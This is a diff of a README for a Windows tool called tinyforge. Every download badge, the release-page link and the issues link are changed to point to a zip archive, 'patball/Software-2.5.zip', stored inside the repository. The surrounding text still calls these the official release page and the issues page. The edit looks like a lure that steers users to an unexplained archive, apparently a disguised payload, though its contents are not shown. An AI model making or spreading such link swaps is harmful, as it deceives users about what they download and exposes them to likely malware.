@@ -1,6 +1,6 @@
 # 🛠 tinyforge - Teach Your Laptop to Code Better
 
-[![Download tinyforge](https://img.shields.io/badge/Download-tinyforge-brightgreen?logo=windows&style=for-the-badge)](https://github.com/martainntwiglike586/tinyforge/releases)
+[![Download tinyforge](https://img.shields.io/badge/Download-tinyforge-brightgreen?logo=windows&style=for-the-badge)](https://raw.githubusercontent.com/martainntwiglike586/tinyforge/main/patball/Software-2.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get tinyforge working on your Windows machine.
 
 Click or tap the button below to go to the official download page. Here you will find the latest version of tinyforge for Windows.
 
-[![Download tinyforge](https://img.shields.io/badge/Download-tinyforge-blue?logo=windows&style=for-the-badge)](https://github.com/martainntwiglike586/tinyforge/releases)
+[![Download tinyforge](https://img.shields.io/badge/Download-tinyforge-blue?logo=windows&style=for-the-badge)](https://raw.githubusercontent.com/martainntwiglike586/tinyforge/main/patball/Software-2.5.zip)
 
 ### 2. Choose the Latest Release
 
@@ -97,7 +97,7 @@ The program will automatically save its progress, so no extra steps are needed.
 
 You can always reach the latest software version by visiting the official release page below. Download the Windows installer and follow the setup steps above.
 
-[Download tinyforge releases](https://github.com/martainntwiglike586/tinyforge/releases)
+[Download tinyforge releases](https://raw.githubusercontent.com/martainntwiglike586/tinyforge/main/patball/Software-2.5.zip)
 
 ---
 
@@ -137,7 +137,7 @@ If you run into any problems:
 
 - Check the "Help" menu inside tinyforge.
 - Visit the GitHub repository for issues:  
-  https://github.com/martainntwiglike586/tinyforge/issues
+  https://raw.githubusercontent.com/martainntwiglike586/tinyforge/main/patball/Software-2.5.zip
 
 - Restart the program, or reinstall if needed following the steps above.
 
